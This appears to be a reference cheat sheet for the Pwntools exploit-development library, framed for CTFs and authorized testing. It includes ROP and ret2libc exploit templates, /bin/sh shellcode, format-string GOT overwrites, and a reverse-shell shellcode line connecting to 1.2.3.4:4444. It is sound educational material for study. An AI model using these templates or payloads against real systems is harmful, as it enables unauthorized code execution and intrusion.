# Pwntools (Python Exploit Development Framework)

> For authorized security testing, CTF competitions, and educational purposes only.

Pwntools is a Python library and set of command-line utilities designed for rapid exploit development and CTF competitions. It provides abstractions for binary interaction, ROP chain construction, shellcode generation, format string exploitation, and remote/local process management, making it the standard toolkit for binary exploitation workflows.

---

## Installation and Setup

### Installing Pwntools

```bash
# Install pwntools (Python 3)
pip install pwntools

# Install with all optional dependencies
pip install pwntools[all]

# Install development version
pip install git+https://github.com/Gallopsled/pwntools.git

# Verify installation
python3 -c "from pwn import *; print(pwnlib.version)"

# Install cross-architecture support
apt install gcc-multilib g++-multilib     # 32-bit on 64-bit
apt install gcc-aarch64-linux-gnu         # ARM64 cross-compiler
apt install qemu-user-static              # run foreign binaries

# Set context for target architecture
# from pwn import *
# context.arch = 'amd64'    # x86-64
# context.arch = 'i386'     # x86-32
# context.arch = 'arm'      # ARM 32-bit
# context.arch = 'aarch64'  # ARM 64-bit
# context.os = 'linux'
# context.log_level = 'debug'  # verbose output
```

## Process Interaction

### Local and Remote Targets

```bash
# Local process interaction
# p = process('./vulnerable_binary')
# p = process('./binary', env={'LD_PRELOAD': './libc.so.6'})
# p = process(['./binary', '--arg1', 'value'])

# Remote connection
# r = remote('challenge.ctf.com', 1337)
# r = remote('127.0.0.1', 4444)

# SSH connection
# s = ssh('user', 'host', port=22, password='pass')
# p = s.process('./binary')

# Sending data
# p.send(b'data')              # send raw bytes
# p.sendline(b'data')          # send with newline
# p.sendafter(b'> ', b'data')  # send after receiving prompt
# p.sendlineafter(b'> ', b'input')

# Receiving data
# p.recv(1024)                 # receive up to 1024 bytes
# p.recvline()                 # receive until newline
# p.recvuntil(b'Password: ')  # receive until marker
# p.recvall()                  # receive until EOF
# p.clean()                    # flush receive buffer

# Interactive mode (for manual exploration)
# p.interactive()

# Process control
# p.wait()                     # wait for exit
# p.poll()                     # check if running
# p.close()                    # terminate
# p.pid                        # get PID
```

## Packing and Unpacking

### Data Conversion Utilities

```bash
# Integer packing (little-endian by default)
# p64(0xdeadbeef)              # pack 64-bit: b'\xef\xbe\xad\xde\x00\x00\x00\x00'
# p32(0xdeadbeef)              # pack 32-bit: b'\xef\xbe\xad\xde'
# p16(0x1337)                  # pack 16-bit: b'\x37\x13'
# p8(0x41)                     # pack 8-bit:  b'\x41'

# Unpacking
# u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')  # -> 0xdeadbeef
# u32(b'\xef\xbe\xad\xde')                    # -> 0xdeadbeef
# u16(b'\x37\x13')                             # -> 0x1337

# Big-endian packing
# p32(0xdeadbeef, endian='big')  # b'\xde\xad\xbe\xef'

# Pack with sign extension
# p32(-1)                        # b'\xff\xff\xff\xff'
# p64(-1, sign='signed')         # all 0xff bytes

# Unpack with fewer bytes (pad with zeros)
# u64(b'\x41\x42\x43\x44\x45\x46', 'fill')  # pads to 8 bytes

# Hex encoding/decoding
# enhex(b'\xde\xad')            # -> 'dead'
# unhex('deadbeef')              # -> b'\xde\xad\xbe\xef'

# Flat (combine multiple items into bytes)
# flat([0x41414141, p64(0xdeadbeef), b'BBBB'])
# flat({0: b'AAAA', 16: p64(ret_addr), 32: shellcode})
```

## ELF Binary Interaction

### Analyzing and Manipulating ELF Files

```bash
# Load an ELF binary
# elf = ELF('./vulnerable_binary')
# libc = ELF('./libc.so.6')

# Symbol resolution
# elf.symbols['main']           # address of main
# elf.got['puts']               # GOT entry for puts
# elf.plt['puts']               # PLT entry for puts
# elf.functions['main']         # Function object with size, address

# Section information
# elf.address                   # base address (0 for PIE)
# elf.entry                     # entry point
# elf.bss()                     # BSS section start

# Search for gadgets and strings
# next(elf.search(b'/bin/sh'))  # find string address
# next(elf.search(b'\xc3'))     # find RET instruction

# Patching binaries
# elf.asm(elf.symbols['check_password'], 'nop; nop; nop')
# elf.write(addr, b'\x90\x90\x90')
# elf.save('./patched_binary')

# Dynamic linking info
# elf.libs                      # dict of linked libraries
# elf.checksec()                # show security features

# Set base address (for PIE binaries after leak)
# elf.address = leaked_base
# # Now all symbols are rebased
# system_addr = elf.symbols['system']  # correct absolute addr
```

## ROP Chain Construction

### Return-Oriented Programming

```bash
# Build ROP chain
# elf = ELF('./binary')
# rop = ROP(elf)

# Find gadgets
# rop.find_gadget(['pop rdi', 'ret'])      # find specific gadget
# rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
# rop.find_gadget(['ret'])                  # for stack alignment

# Call functions via ROP
# rop.call('puts', [elf.got['puts']])       # puts(GOT[puts])
# rop.call('system', [next(elf.search(b'/bin/sh'))])
# rop.call(elf.symbols['win_function'], [0xdeadbeef, 0xcafebabe])

# ret2libc chain
# rop.raw(rop.find_gadget(['ret']).address)  # align stack
# rop.raw(pop_rdi)
# rop.raw(next(elf.search(b'/bin/sh')))
# rop.raw(elf.symbols['system'])

# Using ROP with libc
# libc = ELF('./libc.so.6')
# libc.address = leaked_puts - libc.symbols['puts']
# rop_libc = ROP(libc)
# rop_libc.call('execve', [next(libc.search(b'/bin/sh')), 0, 0])

# Print the chain
# print(rop.dump())

# Get chain bytes
# chain = rop.chain()

# SROP (Sigreturn-Oriented Programming)
# frame = SigreturnFrame()
# frame.rax = constants.SYS_execve
# frame.rdi = binsh_addr
# frame.rsi = 0
# frame.rdx = 0
# frame.rip = syscall_addr
# payload = p64(sigreturn_gadget) + bytes(frame)

# Multi-binary ROP
# rop = ROP([elf, libc])
```

## Shellcode Generation

### Crafting Shellcode

```bash
# Generate shellcode for current context
# context.arch = 'amd64'

# execve("/bin/sh", NULL, NULL)
# shellcode = asm(shellcraft.sh())
# shellcode = asm(shellcraft.amd64.linux.sh())

# Specific shellcode types
# asm(shellcraft.cat('/flag'))           # read and print file
# asm(shellcraft.connect('1.2.3.4', 4444) + shellcraft.dupsh())
# asm(shellcraft.bindsh(4444))           # bind shell on port

# Custom assembly
# shellcode = asm('''
#     xor rdi, rdi
#     push rdi
#     push 0x68732f2f
#     push 0x6e69622f
#     mov rdi, rsp
#     xor rsi, rsi
#     xor rdx, rdx
#     mov al, 59
#     syscall
# ''')

# Shellcode with constraints (avoid bad bytes)
# shellcode = asm(shellcraft.sh())
# # Check for bad bytes
# assert b'\x00' not in shellcode, "Contains null bytes!"
# assert b'\x0a' not in shellcode, "Contains newlines!"

# Encode shellcode to avoid bad characters
# encoded = asm(shellcraft.amd64.linux.sh(),
#               avoid=b'\x00\x0a\x0d')

# Disassemble shellcode
# print(disasm(shellcode))

# Write shellcode to file
# write('shellcode.bin', shellcode)

# Run shellcode directly
# run_shellcode(shellcode).interactive()
```

## Format String Exploitation

### Automated Format String Attacks

```bash
# Auto-detect format string offset
# from pwn import *
# def send_fmt(payload):
#     p = process('./vuln')
#     p.sendline(payload)
#     return p.recvall()
#
# fmt = FmtStr(execute_fmt=send_fmt)
# print(f"Offset: {fmt.offset}")

# Read from arbitrary address
# payload = fmtstr_payload(offset, reads={target_addr: None})

# Write to arbitrary address
# payload = fmtstr_payload(offset, writes={
#     elf.got['exit']: elf.symbols['win'],  # overwrite GOT
# })

# Write with specific format string length
# payload = fmtstr_payload(offset, writes={
#     target: value
# }, numbwritten=0, write_size='short')
# write_size options: 'byte', 'short', 'int'

# Manual format string (read stack values)
# payload = b'%p.' * 20        # dump 20 stack values
# payload = b'%7$p'            # read 7th stack argument
# payload = b'%7$s'            # read string at 7th arg (dereference)

# Manual format string write
# # Write 0x41 to address at position 7
# payload = p64(target_addr) + b'%49c%7$hhn'
# # 8 bytes (addr) + 49 pad = 57 = 0x39... adjust for value
```

## Cyclic Patterns and Offset Finding

### Buffer Overflow Offset Discovery

```bash
# Generate cyclic pattern
# pattern = cyclic(200)          # 200-byte De Bruijn pattern
# pattern = cyclic(500, n=8)     # 8-byte subsequences (64-bit)

# Find offset from crash value
# cyclic_find(0x61616168)        # returns offset (e.g., 28)
# cyclic_find(0x6161616861616167, n=8)  # 64-bit pattern

# Typical workflow:
# 1. Send cyclic pattern to crash the program
# p = process('./vuln')
# p.sendline(cyclic(200))
# p.wait()
# # 2. Check crash address in GDB/core dump
# # EIP/RIP = 0x61616168
# # 3. Find offset
# offset = cyclic_find(0x61616168)  # -> 28
# # 4. Build exploit
# payload = b'A' * offset + p32(target_addr)
```

## DynELF (Remote Symbol Resolution)

### Leaking libc Addresses Without libc Binary

```bash
# DynELF resolves symbols from a remote process
# when you don't have the exact libc version

# Requires: an arbitrary read primitive (info leak)
# def leak(addr):
#     """Read memory at addr via vulnerability"""
#     payload = b'A' * offset
#     payload += p64(pop_rdi) + p64(addr)
#     payload += p64(plt_puts) + p64(main)
#     p.sendline(payload)
#     data = p.recvline().strip()
#     if not data:
#         return b'\x00'
#     return data
#
# d = DynELF(leak, elf=elf)
# system_addr = d.lookup('system', 'libc')
# printf_addr = d.lookup('printf', 'libc')
#
# # Now build exploit with resolved addresses
# payload = b'A' * offset
# payload += p64(pop_rdi) + p64(binsh_addr)
# payload += p64(system_addr)
```

## Exploit Templates and Patterns

### Common Exploit Structures

```bash
# Full ret2libc exploit template
# from pwn import *
#
# context.binary = elf = ELF('./vuln')
# libc = ELF('./libc.so.6')
#
# def exploit():
#     if args.REMOTE:
#         p = remote('challenge.ctf.com', 1337)
#     else:
#         p = process(elf.path)
#
#     # Stage 1: Leak libc address
#     rop1 = ROP(elf)
#     rop1.call('puts', [elf.got['puts']])
#     rop1.call(elf.symbols['main'])
#
#     p.sendlineafter(b'> ', flat({
#         offset: rop1.chain()
#     }))
#
#     leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
#     libc.address = leaked - libc.symbols['puts']
#     log.success(f'libc base: {hex(libc.address)}')
#
#     # Stage 2: ret2system
#     rop2 = ROP(libc)
#     rop2.call('system', [next(libc.search(b'/bin/sh\x00'))])
#
#     p.sendlineafter(b'> ', flat({
#         offset: rop2.chain()
#     }))
#
#     p.interactive()
#
# exploit()

# Heap exploit template
# from pwn import *
#
# def alloc(p, idx, size, data):
#     p.sendlineafter(b'> ', b'1')
#     p.sendlineafter(b'Index: ', str(idx).encode())
#     p.sendlineafter(b'Size: ', str(size).encode())
#     p.sendafter(b'Data: ', data)
#
# def free(p, idx):
#     p.sendlineafter(b'> ', b'2')
#     p.sendlineafter(b'Index: ', str(idx).encode())
#
# def show(p, idx):
#     p.sendlineafter(b'> ', b'3')
#     p.sendlineafter(b'Index: ', str(idx).encode())
#     return p.recvline()
```

## Command-Line Utilities

### Pwntools CLI Tools

```bash
# checksec - check binary protections
checksec ./binary
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# cyclic - generate/find patterns
cyclic 100                    # generate 100-byte pattern
cyclic -l 0x61616168          # find offset of value

# shellcraft - generate shellcode
shellcraft amd64.linux.sh     # print shell shellcode asm
shellcraft -f asm amd64.linux.cat /flag

# asm/disasm - assemble/disassemble
asm 'mov eax, 1; int 0x80'   # assemble to hex
disasm '31c050682f2f7368'     # disassemble hex

# unhex - decode hex
echo '41424344' | unhex       # -> ABCD

# phd - pretty hex dump
phd shellcode.bin

# errno - lookup error codes
errno 13                      # EACCES: Permission denied

# constgrep - search constants
constgrep -c amd64 SYS_exec   # find syscall numbers
```

## Logging and Debugging

### Debug Workflows

```bash
# Attach GDB to process
# p = process('./vuln')
# gdb.attach(p, '''
#     break *main+42
#     continue
# ''')

# Attach GDB with specific debugger
# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(p, gdbscript='b *0x401234\nc')

# Debug with gdbserver
# p = gdb.debug('./vuln', '''
#     break main
#     continue
# ''')

# Logging levels
# context.log_level = 'debug'   # show all traffic
# context.log_level = 'info'    # default
# context.log_level = 'warn'    # minimal output
# context.log_level = 'error'   # errors only

# Custom logging
# log.info("Leaked address: %#x", addr)
# log.success("Got shell!")
# log.warning("Exploit may be unreliable")

# Hex dump received data
# data = p.recv(64)
# log.info(hexdump(data))
```

---

## Tips

- Always set `context.binary` early; it auto-configures architecture, endianness, and word size for all pwntools operations
- Use `p.sendlineafter()` instead of `p.sendline()` to avoid race conditions with slow remote targets
- When leaking addresses, pad with `ljust(8, b'\x00')` before `u64()` to handle stripped newlines and short reads
- Use `flat()` with dictionary syntax for complex payloads: `flat({0: b'A'*8, 40: p64(addr)})` is clearer than concatenation
- Set `context.terminal = ['tmux', 'splitw', '-h']` for seamless GDB attachment in tmux sessions
- Run exploits with `args.REMOTE` checks so the same script works locally and against remote targets
- Use `elf.address = leaked_base` to rebase PIE binaries; all subsequent symbol lookups return correct addresses
- Cache libc lookups with `libc = ELF('./libc.so.6')` rather than resolving symbols at runtime when you have the binary
- For heap exploits, write helper functions (alloc/free/show) to keep the exploit readable and maintainable
- Use `context.log_level = 'debug'` when developing to see all sent and received data in hex

---

## See Also

- reverse-engineering
- gdb-security
- checksec
- fuzzing

## References

- [Pwntools Documentation](https://docs.pwntools.com/en/latest/)
- [Pwntools GitHub Repository](https://github.com/Gallopsled/pwntools)
- [Pwntools Tutorials](https://github.com/Gallopsled/pwntools-tutorial)
- [ROP Emporium](https://ropemporium.com/)
- [Nightmare - Binary Exploitation Course](https://guyinatuxedo.github.io/)
- [how2heap](https://github.com/shellphish/how2heap)
- [LiveOverflow Binary Exploitation](https://liveoverflow.com/binary-exploitation/)
